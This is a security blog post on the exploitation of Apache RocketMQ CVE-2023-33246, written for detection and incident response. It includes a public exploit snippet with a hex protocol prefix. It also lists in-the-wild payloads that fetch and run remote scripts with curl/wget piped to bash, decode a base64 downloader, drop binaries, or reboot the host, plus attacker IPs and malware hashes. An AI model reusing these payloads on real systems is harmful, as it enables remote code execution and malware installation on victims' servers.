---
title: "Exposing RocketMQ CVE-2023-33246 Payloads - Blog - VulnCheck"
date: 2023-09-05T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Exposing RocketMQ CVE-2023-33246 Payloads - Blog - VulnCheck

<br/>

<br/>
\[CVE-2023-33246\](https://nvd.nist.gov/vuln/detail/CVE-2023-33246) is an easy to exploit vulnerability affecting Apache \[RocketMQ\](https://rocketmq.apache.org/). The vulnerability allows a remote and unauthenticated attacker to update the RocketMQ broker configuration in order to abuse a command injection. \[Juniper Networks\](https://blogs.juniper.net/en-us/threat-research/dreambus-botnet-resurfaces-targets-rocketmq-vulnerability) has reported exploitation of this issue has been ongoing since June 2023.\\n\\nExploitation occurs via a custom remoting protocol to the RocketMQ broker ports (by default 10909 and 10911). That’s important to note because neither Shodan or Censys specifically detect this protocol. Shodan does an especially bad job of indexing these ports. That makes it hard to determine the actual scope of vulnerable systems in the wild.\\n\\nFortunately, Censys can be manipulated into giving us some insight. By searching for hosts that expose tcp/9876 (RocketMQ nameserver) and one of the default broker ports (tcp/10909 and tcp/10911), we find approximately \[4500\](https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per\_page=25&virtual\_hosts=INCLUDE&q=services.port%3D9876+and+%28services.port%3D10909+or+services.port%3D10911%29) potentially affected systems. However, the extreme concentration of systems in one country does call into question how many of these may be honeypots.\\n\\n!\[Potential RocketMQ brokers on Censys\](/blog/rocketmq-exploit-payloads/rocketmq-censys.png){:width="100%"}\\n\\nThe RocketMQ broker was never meant to be exposed to the internet. The interface is insecure by design and offers a variety of administrative functions. Updating the broker configuration is only one of those functions. Another one, useful for defenders, is downloading the broker configuration, freely without authentication.\\n\\nWhen the attacker updates the broker configuration with a malicious “rocketmqHome” variable, the attacker payload doesn’t get executed immediately. Instead, the payload is written into the configuration file. Some seconds later, a process parses the configuration, and executes a shell command containing the malicious variable, resulting in attacker code execution. The important part is, unless they overwrite it, the attacker payload persists in the configuration indefinitely.\\n\\nIf you understand the protocol, it’s very easy to download the configuration file so that you can examine it for indicators of compromise. Looking at some of the public exploits, such as \[XDB-b486dcf3f31d\](https://vulncheck.com/xdb/b486dcf3f31d), you can see some attackers are just throwing blobs of hex at victims.\\n\\n\`\`\`python\\nif '\_\_main\_\_' == \_\_name\_\_:\\n ip = sys.argv\[1\]\\n port = int(sys.argv\[2\]) \\n command = ' '.join(sys.argv\[3:\]).strip()\\n hex\_payload\_prefix = '000000cd000000607b22636f6465223a32352c22666c6167223a302c226c616e6775616765223a224a415641222c226f7061717565223a302c2273657269616c697a655479706543757272656e74525043223a224a534f4e222c2276657273696f6e223a3339357d66696c7465725365727665724e756d733d310a726f636b65746d71486f6d653d2d632024407c7368202e206563686f20' \\n hex\_payload\_suffix = '3b0a'\\n payload = bytes.fromhex(hex\_payload\_prefix) + command.encode() + bytes.fromhex(hex\_payload\_suffix)\\n hex\_payload\_length = hex(len(payload) - 4)\[2:\]\\n payload = payload.hex().replace('000000cd000000','000000' + hex\_payload\_length + '000000')\\n payload = bytes.fromhex(payload)\\n\`\`\`\\n\\nBased on that exploit, it seems likely that the type of attacker that would use that script would have no understanding of the underlying protocol that carries the payload into the configuration file. They wouldn't know anyone can download the configuration file and examine the payload.\\n\\nUsing our \[go-exploit\](https://pkg.go.dev/github.com/vulncheck-oss/go-exploit) framework, we wrote a tool that will download RocketMQ broker configuration files and extract the vulnerable \`rocketmqHome\` variable. The tool is available on \[GitHub\](https://github.com/vulncheck-oss/fetch-broker-conf), and it can be used to quickly hunt for exploited RocketMQ systems..\\n\\nThere are various ways to provide any go-exploit binary “targets”, but the easiest way to scan many hosts is by using the \`-rhosts-file\` option. The following is an example:\\n\\n\`\`\`sh\\nalbinolobster@mournland:~/fetch-broker-conf$ ./build/main\_linux-arm64 -a -e -rhosts-file /tmp/rocketmq.csv -log-json true 2>/dev/null | jq 'select(.msg == "Extracted the variable")'\\n{\\n "time": "2023-08-31T13:45:35.781849255-04:00",\\n "level": "SUCCESS",\\n "msg": "Extracted the variable",\\n "rocketmqHome": "-c $@|sh . echo (curl -s x.x.x.x/rm.sh||wget -q -O- x.x.x.x/rm.sh)|bash;",\\n "host": "x.x.x.x",\\n "port": 10909\\n}\\n{\\n "time": "2023-08-31T13:45:39.420484976-04:00",\\n "level": "SUCCESS",\\n "msg": "Extracted the variable",\\n "rocketmqHome": "-c $@|sh . echo (curl -s x.x.x.x/rm.sh||wget -q -O- 45.15.158.124/rm.sh)|bash;",\\n "host": "x.x.x.x",\\n "port": 10909\\n}\\n\`\`\`\\n\\nBy scanning potentially affected systems, we found a variety of malicious payloads. It should be noted that it’s very straightforward for an attacker to overwrite their malicious \`rocketmqHome\` with a benign value, so the attackers we caught aren’t the best out there. Regardless, the following is a small sampling of interesting payloads, associated addresses, and malware hashes.\\n\\n### Exploit Payloads\\n\\n\`\`\`\\n"rocketmqHome": "-c $@|sh . echo curl http://x.x.x.x:8888/shc | tee /tmp/shc;",\\n"rocketmqHome": "-c $@|sh . echo curl --output gr http://x.x.x.x/bins/x86; chmod 777 \*; ./gr apache.x86;",\\n"rocketmqHome": "-c $@|sh . echo (curl -s x.x.x.x/rm.sh||wget -q -O- x.x.x.x/rm.sh)|bash;",\\n"rocketmqHome": "-c $@|sh . echo echo \\"a2VybmVsPSQodW5hbWUgLWEpCmlmIFtbICRrZXJuZWwgPT0gKiJhbWQ2NCIqIF1dIHx8IFtbICRrZXJuZWwgPT0gKiJ4ODZfNjQiKiBdXTsgdGhlbgogICAgZG93bmxvYWRlcj1odHRwOi8vYWNmLXByb2R1Y2FvLnMzLmFtYXpvbmF3cy5jb20vcWZpcG5yZ2t1eGFlagplbGlmIFtbICRrZXJuZWwgPT0gKiJpMzg2IiogXV0gfHwgW1sgJGtlcm5lbCA9PSAqImk2ODYiKiBdXTsgdGhlbgogICAgZG93bmxvYWRlcj1odHRwOi8vYXNobGV5aHViLnMzLmFtYXpvbmF3cy5jb20vd2piZ3NveGhwdnJteQplbGlmIFtbICRrZXJuZWwgPT0gKiJhcm0iKiBdXTsgdGhlbgogICAgZG93bmxvYWRlcj1odHRwOi8vYWFhZHV0eXYxLnMzLmFtYXpvbmF3cy5jb20vcHdrb2RpeWxhaG51dgplbHNlCiAgICBkb3dubG9hZGVyPWh0dHA6Ly9icmF6aWxmb3VuZGF0aW9uLWFzc2V0cy5zMy5hbWF6b25hd3MuY29tL2pubGJldGNvcnFwaGcKZmkKZWNobyAyODk3MTY0MjcgPiAvdG1wLzAKY3VybCAtbyAvdG1wLzEyMyAkZG93bmxvYWRlcgpjaG1vZCAreCAvdG1wLzEyMwpzaCAtYyAvdG1wLzEyMwo=\\"|base64 -d|bash -i;",\\n"rocketmqHome": "-c $@|sh . echo reboot;",\\n\`\`\`\\n\\n### Associated Attacker IP Addresses\\n\\n\`\`\`\\n103.85.25.121\\n94.156.6.110\\n45.15.158.124\\n134.209.58.230\\nacf-producao.s3.amazonaws.com\\nashleyhub.s3.amazonaws.com\\naaadutyv1.s3.amazonaws.com\\nbrazilfoundation-assets.s3.amazonaws.com\\n\`\`\`\\n\\n### Dropped Executable Hashes\\n\\n\* \[1d489a41395be76a8101c2e1eba383253a291f4e84a9da389c6b58913786b8ac\](https://www.virustotal.com/gui/file/1d489a41395be76a8101c2e1eba383253a291f4e84a9da389c6b58913786b8ac/detection)\\n\* \[d7843904e1c25055e14cae8b44b28f9dd4706c0ad8b03f55dfcded36ce8423a0\](https://www.virustotal.com/gui/file/d7843904e1c25055e14cae8b44b28f9dd4706c0ad8b03f55dfcded36ce8423a0/detection)\\n\* \[4feb3dcfe57e3b112568ddd1897b68aeb134ef8addd27b660530442ea1e49cbb\](https://www.virustotal.com/gui/file/4feb3dcfe57e3b112568ddd1897b68aeb134ef8addd27b660530442ea1e49cbb/detection)\\n\* \[f93e9bc9583058d82d2d3fe35117cbb9a553d54e7149846b2dc94446f0836201\](https://www.virustotal.com/gui/file/f93e9bc9583058d82d2d3fe35117cbb9a553d54e7149846b2dc94446f0836201/detection)\\n\* \[49062378ab3e4a0d78c6db662efb4dbc680808fb75834b4674809bc8903adaea\](https://www.virustotal.com/gui/file/49062378ab3e4a0d78c6db662efb4dbc680808fb75834b4674809bc8903adaea/detection)\\n\\n\\n## Conclusion\\n\\nTo our knowledge, CVE-2023-33246 is only associated with one botnet. However, it’s clear there are at least a few active actors, and even more victims. This is a good opportunity to remove your RocketMQ instance from the internet and to examine the broker configuration for signs of exploitation.\\n\\n\\n## Learn More\\n\\nIf you are as interested in exploits, attack surfaces, and vulnerabilities like we are then you might be interested in VulnCheck. Register for a VulnCheck account today by clicking "Sign in / Join Community" and schedule a demo to learn more.\\n

#### [Source](https://vulncheck.com/blog/rocketmq-exploit-payloads)

<br/>
---
